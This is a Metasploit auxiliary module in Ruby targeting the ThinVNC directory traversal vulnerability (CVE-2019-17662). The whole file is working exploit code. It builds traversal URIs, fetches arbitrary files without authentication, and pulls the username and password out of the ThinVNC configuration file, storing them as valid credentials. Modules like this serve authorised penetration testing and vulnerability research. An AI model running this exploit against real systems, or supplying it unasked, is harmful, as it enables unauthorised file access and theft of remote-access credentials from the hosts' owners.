##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ThinVNC Directory Traversal',
      'Description' => %q{
        This module exploits a directory traversal vulnerability in ThinVNC
        versions 1.0b1 and prior which allows unauthenticated users to retrieve
        arbitrary files, including the ThinVNC configuration file.

        This module has been tested successfully on ThinVNC versions 1.0b1
        and "ThinVNC_Latest" (2018-12-07).
      },
      'References'  =>
        [
          ['CVE', '2019-17662'],
          ['URL', 'https://github.com/bewest/thinvnc/issues/5'],
          ['URL', 'https://github.com/shashankmangal2/Exploits/blob/master/ThinVNC-RemoteAccess/POC.py'],
          ['URL', 'https://redteamzone.com/ThinVNC/']
        ],
      'Author'      =>
        [
          'jinxbox', # Discovery and PoC
          'WarMarX', # PoC
          'bcoles'   # metasploit
        ],
      'DefaultOptions' => { 'RPORT' => 8080 },
      'DisclosureDate' => '2019-10-16',
      'License' => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', 'ThinVnc.ini']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 2])
      ])
  end

  def run_host(ip)
    depth = datastore['DEPTH']
    filepath = datastore['FILEPATH']

    res = retrieve_file(depth, filepath)

    return if res.blank?

    filename = File.basename(filepath)

    path = store_loot(
      'thinvnc.traversal',
      'text/plain',
      ip,
      res.to_s,
      filename
    )

    print_good("File #{filename} saved in: #{path}")

    # Report vuln and store creds if we successfully retrieved the config file
    if filename.downcase == 'thinvnc.ini' && res.to_s.start_with?('[Authentication]')
      report_service(
        :host => ip,
        :port => rport,
        :sname => (ssl ? 'https' : 'http'),
        :info => 'ThinVNC'
      )

      report_vuln(
        :host  => ip,
        :port  => rport,
        :proto => 'tcp',
        :sname => (ssl ? 'https' : 'http'),
        :name  => 'ThinVNC Directory Traversal',
        :info  => 'ThinVNC Directory Traversal',
        :refs  => self.references
      )

      username = res.scan(/^User=(.+)$/).flatten.first.to_s.strip
      password = res.scan(/^Password=(.+)$/).flatten.first.to_s.strip

      if username && password
        print_good "Found credentials: #{username}:#{password}"
        store_valid_credential(user: username, private: password)
      end
    end
  end

  def retrieve_file(depth, filepath)
    traversal = Rex::Text.rand_text_alphanumeric(3..5)
    traversal << '/'
    traversal << '../' * depth
    traversal << filepath

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, traversal)
    })

    unless res
      vprint_error 'No reply'
      return
    end

    if res.code == 404
      vprint_error 'File not found'
      return
    end

    if res.code != 200
      vprint_error 'Unexpected reply'
      return
    end

    res.body.to_s
  end
end
